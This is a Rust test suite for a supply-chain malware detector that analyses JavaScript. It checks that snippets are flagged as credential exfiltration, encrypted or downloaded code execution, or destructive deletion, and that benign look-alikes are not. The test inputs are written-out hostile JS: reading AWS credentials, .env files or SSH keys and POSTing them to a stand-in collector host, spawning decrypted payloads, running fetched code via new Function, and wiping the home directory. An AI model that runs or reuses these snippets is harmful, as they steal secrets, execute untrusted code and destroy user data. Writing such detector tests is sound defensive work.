fn detected(source: &str, tag: &str) -> bool {
    let result = super::super::analyze_bytes("index.js", source.as_bytes());
    assert_eq!(result.unparsed_files, 0);
    serde_json::to_value(result.supply_chain).unwrap()[tag] == true
}

#[test]
fn credential_file_contents_in_fetch_body_are_reported() {
    assert!(detected(
        "const fs = require('node:fs'); const path = require('node:path'); const os = require('node:os'); const data = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'), 'utf8'); fetch('https://collector.example', {method:'POST', body: data});",
        "credentialExfiltration"
    ));
}

#[test]
fn credential_file_contents_in_http_request_are_reported() {
    assert!(detected(
        "import {readFileSync as read} from 'node:fs'; import https from 'node:https'; const data = read('.env', 'utf8'); const req = https.request({hostname:'collector.example', method:'POST'}); req.write(JSON.stringify({data})); req.end();",
        "credentialExfiltration"
    ));
}

#[test]
fn decrypted_bytes_written_then_spawned_are_reported() {
    assert!(detected(
        "const crypto = require('crypto'); const fs = require('fs'); const cp = require('child_process'); function decrypt(key, blob) { const d = crypto.createDecipheriv('aes-256-gcm', key, blob.slice(0,12)); return Buffer.concat([d.update(blob.slice(12)), d.final()]); } function launch(key, blob) { const code = decrypt(key, blob).toString('utf8'); const target = '/tmp/runtime.py'; fs.writeFileSync(target, code); cp.spawn('python3', [target], {detached:true}); }",
        "encryptedExecution"
    ));
}

#[test]
fn downloaded_response_passed_to_function_is_reported() {
    assert!(detected(
        "async function load() { const response = await fetch('https://cdn.example/code'); const code = await response.text(); new Function(code)(); }",
        "downloadedExecution"
    ));
}

#[test]
fn recursive_removal_of_home_is_reported() {
    assert!(detected(
        "const fs = require('fs'); const os = require('os'); fs.rmSync(os.homedir(), {recursive:true, force:true});",
        "destructiveFilesystem"
    ));
}

#[test]
fn benign_file_crypto_download_and_cleanup_controls_have_no_targeted_warning() {
    for source in [
        "const fs = require('fs'); const data = fs.readFileSync('README.md','utf8'); fetch('https://docs.example', {body:data});",
        "const fs = require('fs'); const data = fs.readFileSync('.env','utf8'); fetch('https://api.example', {body: redact(data)});",
        "const fs = {readFileSync: () => 'public'}; fetch('https://api.example', {body: fs.readFileSync('.env')});",
        "const fs = require('fs'); let data = fs.readFileSync('.env'); data = 'public'; fetch('https://api.example', {body:data});",
        "const fs = require('fs'); const options = {body:fs.readFileSync('.env')}; options.body='public'; fetch('https://api.example',options);",
        "async function load() { const r = await fetch('https://cdn.example/data'); const text = await r.text(); JSON.parse(text); new Function('return 42')(); }",
        "const crypto=require('crypto'); const fs=require('fs'); const cp=require('child_process'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); fs.writeFileSync('data.json',d.update(data)); cp.spawn('node',['build.js']);",
        "const fs=require('fs'); const os=require('os'); const path=require('path'); fs.rmSync(path.join(os.homedir(),'.cache','tool'), {recursive:true,force:true});",
        "const fs=require('fs'); fs.rmSync('dist',{recursive:true,force:true});",
    ] {
        for tag in [
            "credentialExfiltration",
            "encryptedExecution",
            "downloadedExecution",
            "destructiveFilesystem",
        ] {
            assert!(!detected(source, tag), "{tag}: {source}");
        }
    }
}

#[test]
fn overwritten_and_unreachable_artifacts_do_not_establish_execution() {
    for source in [
        "const fs=require('fs'), cp=require('child_process'), crypto=require('crypto'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); const target='script.js'; fs.writeFileSync(target,d.update(data)); fs.writeFileSync(target,'public'); cp.spawn('node',[target]);",
        "const fs=require('fs'), os=require('os'); if (false) { fs.rmSync(os.homedir(),{recursive:true}); }",
        "const fs=require('fs'), os=require('os'); function clean() { return; fs.rmSync(os.homedir(),{recursive:true}); }",
        "const fs=require('fs'), cp=require('child_process'), crypto=require('crypto'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); const target='script.js'; if (encrypted) { fs.writeFileSync(target,d.update(data)); } else { cp.spawn('node',[target]); }",
        "const fs=require('fs'), cp=require('child_process'), crypto=require('crypto'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); const target='script.js'; fs.writeFileSync(target,d.update(data)); cp.spawn('echo',[target]);",
    ] {
        for tag in [
            "encryptedExecution",
            "downloadedExecution",
            "destructiveFilesystem",
        ] {
            assert!(!detected(source, tag), "{tag}: {source}");
        }
    }
}

#[test]
fn credential_file_added_to_a_report_then_uploaded_is_reported() {
    assert!(detected(
        "const fs=require('fs'),https=require('https'); function report(){const data={type:'report'}; if(fs.existsSync('.env')){data.dotenv=fs.readFileSync('.env','utf8').substring(0,1000);} const body=JSON.stringify(data); const req=https.request({hostname:'collector.example',method:'POST'}); req.write(body);}",
        "credentialExfiltration"
    ));
}

#[test]
fn report_mutations_and_sanitizers_do_not_retain_replaced_credentials() {
    for update in [
        "data.dotenv='public';",
        "const alias=data; alias.dotenv='public';",
        "sanitize(data);",
        "delete data.dotenv;",
        "data[key]='public';",
    ] {
        let source = format!(
            "const fs=require('fs'); const data={{}}; data.dotenv=fs.readFileSync('.env'); {update} fetch('https://api.example',{{body:JSON.stringify(data)}});"
        );
        assert!(!detected(&source, "credentialExfiltration"), "{source}");
    }
}

#[test]
fn decrypted_code_launched_by_a_resolved_interpreter_helper_is_reported() {
    assert!(detected(
        "const cp=require('child_process'),crypto=require('crypto'),fs=require('fs'); function findPython(){const bins=['python3','python']; for(let i=0;i<bins.length;i++){if(cp.spawnSync(bins[i],['--version']).status===0){return bins[i];}} return null;} const d=crypto.createDecipheriv('aes-256-gcm',key,iv); const file='/tmp/exec.py'; fs.writeFileSync(file,d.update(blob)); const python=findPython(); cp.spawn(python,[file]);",
        "encryptedExecution"
    ));
}

#[test]
fn project_contents_removed_through_helpers_are_reported() {
    assert!(detected(
        "const fs=require('fs'),path=require('path'); const opts=Object.freeze({recursive:true,force:true}); function root(input){return path.resolve(input || process.cwd());} function join(root,name){return path.join(root,name);} function entries(root){return fs.readdirSync(root,{withFileTypes:true});} function remove(target,isDir){if(isDir){fs.rmSync(target,opts);}else{fs.unlinkSync(target);}} function wipe(root){const list=entries(root); for(const item of list){const target=join(root,item.name);remove(target,item.isDirectory());}} async function run(directory=process.cwd()){const target=root(directory);const r=await fetch('https://gate.example');if(!r.ok)return;wipe(target);}",
        "destructiveFilesystem"
    ));
}

#[test]
fn filtered_cache_entries_and_scoped_cleanup_do_not_report_broad_deletion() {
    for source in [
        "const fs=require('fs'),path=require('path'); const root=process.cwd(); for(const item of fs.readdirSync(root,{withFileTypes:true}).filter(e=>e.name==='cache')){fs.rmSync(path.join(root,item.name),{recursive:true});}",
        "const fs=require('fs'),path=require('path'); function clean(root){for(const item of fs.readdirSync(root,{withFileTypes:true})){fs.rmSync(path.join(root,item.name),{recursive:true});}} clean(path.join(process.cwd(),'dist'));",
    ] {
        assert!(!detected(source, "destructiveFilesystem"), "{source}");
    }
}

#[test]
fn callback_reads_and_dead_or_overwritten_report_fields_do_not_establish_uploads() {
    for source in [
        "const fs=require('fs'); fetch('https://api.example',{body:fs.readFile('.env',()=>{})});",
        "const fs=require('fs'); const data={}; if(false){data.dotenv=fs.readFileSync('.env');} fetch('https://api.example',{body:JSON.stringify(data)});",
        "const fs=require('fs'); const data={}; data.dotenv=fs.readFileSync('.env'); data.dotenv &&= 'public'; fetch('https://api.example',{body:JSON.stringify(data)});",
    ] {
        assert!(!detected(source, "credentialExfiltration"), "{source}");
    }
}

#[test]
fn aliased_filesystem_methods_keep_their_imported_identity() {
    assert!(detected(
        "import {rmSync as remove} from 'node:fs'; import {homedir as home} from 'node:os'; remove(home(),{recursive:true});",
        "destructiveFilesystem"
    ));
    assert!(detected(
        "const {rmSync:remove}=require('fs'); const os=require('os'); remove(os.homedir(),{recursive:true});",
        "destructiveFilesystem"
    ));
}

#[test]
fn dead_uploads_and_unused_eval_arguments_do_not_report_execution_or_theft() {
    for source in [
        "const fs=require('fs'); if(false){fetch('https://api.example',{body:fs.readFileSync('.env')});}",
        "const fs=require('fs'); function send(){return;fetch('https://api.example',{body:fs.readFileSync('.env')});}",
        "const crypto=require('crypto'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); eval('42',d.update(data).toString());",
    ] {
        for tag in ["credentialExfiltration", "encryptedExecution"] {
            assert!(!detected(source, tag), "{tag}: {source}");
        }
    }
}

#[test]
fn eval_requires_text_while_function_constructor_converts_bytes() {
    let setup =
        "const crypto=require('crypto'); const d=crypto.createDecipheriv('aes-256-gcm',key,iv); ";
    for expression in [
        "eval(d.update(data));",
        "eval(Buffer.concat([d.update(data),d.final()]));",
    ] {
        assert!(!detected(
            &format!("{setup}{expression}"),
            "encryptedExecution"
        ));
    }
    assert!(detected(
        &format!("{setup}eval(d.update(data,'hex','utf8'));"),
        "encryptedExecution"
    ));
    assert!(detected(
        &format!("{setup}new Function(d.update(data));"),
        "encryptedExecution"
    ));
    assert!(!detected(
        "async function run(){const response=await fetch('https://api.example');eval(await response.arrayBuffer());}",
        "downloadedExecution"
    ));
}

#[test]
fn similar_public_path_suffixes_do_not_count_as_credential_files() {
    for path in [
        "public.aws/credentials",
        "public.ssh/id_rsa",
        "public.ssh/id_ed25519",
        "public.kube/config",
        "public.git-credentials",
    ] {
        let source = format!(
            "const fs=require('fs'); fetch('https://api.example',{{body:fs.readFileSync('{path}')}});"
        );
        assert!(!detected(&source, "credentialExfiltration"), "{path}");
    }
}
